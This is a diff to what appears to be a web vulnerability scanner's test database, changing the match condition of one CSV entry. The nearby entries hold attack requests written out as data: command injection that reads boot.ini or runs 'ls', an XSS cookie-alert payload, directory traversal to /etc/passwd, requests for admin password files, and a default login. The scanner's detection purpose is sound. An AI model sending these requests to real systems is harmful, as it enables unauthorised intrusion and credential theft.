@@ -1495,7 +1495,7 @@
 "001486","279","7","@CGIDIRSWINDMAIL.EXE?%20-n%20c:\boot.ini%20Hacker@hax0r.com%20|%20dir%20c:\\","GET","200","","","","","WINDMAIL.EXE can read arbitrary files","",""
 "001487","2790","4","/index.php?vo=\"><script>alert(document.cookie);</script>","GET","><script>alert\(document\.cookie\);<\/script>","","","","","Ralusp Sympoll 1.5 is vulnerable to Cross Site Scripting (XSS). CA-2000-02.","",""
 "001488","2793","7","/.../.../.../.../.../.../.../.../.../.../etc/passwd","GET","root:","","","","","TelCondex SimpleWebserver 2.13.31027 and below allows directory traversal.","",""
-"001489","2799","8","@CGIDIRSdose.pl?daily&somefile.txt&|ls|","GET","somefile\.txt","","","","","DailyDose 1.1 is vulnerable to a directory traversal attack in the 'list' parameter.","",""
+"001489","2799","8","@CGIDIRSdose.pl?daily&somefile.txt&|ls|","GET","somefile\.txt","","200","","","DailyDose 1.1 is vulnerable to a directory traversal attack in the 'list' parameter.","",""
 "001490","2813","4","/admin/database/wwForum.mdb","GET","200","","","","","Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein","",""
 "001491","2830","5","/../config.dat","GET","EnablePasswords","","","","","Directory traversal and config.dat suggests NetServe web server and default admin folder. This file contains the administrative login/pass.","",""
 "001492","284","3","/iisadmpwd/aexp2.htr","GET","200","","","value=\"\"","","Gives domain and system name, may allow an attacker to brute force for access. Also will allow an NT4 user to change his password regardless of the 'user cannot change password' security policy. CVE-1999-0407. BID-4236. BID-2110.","",""
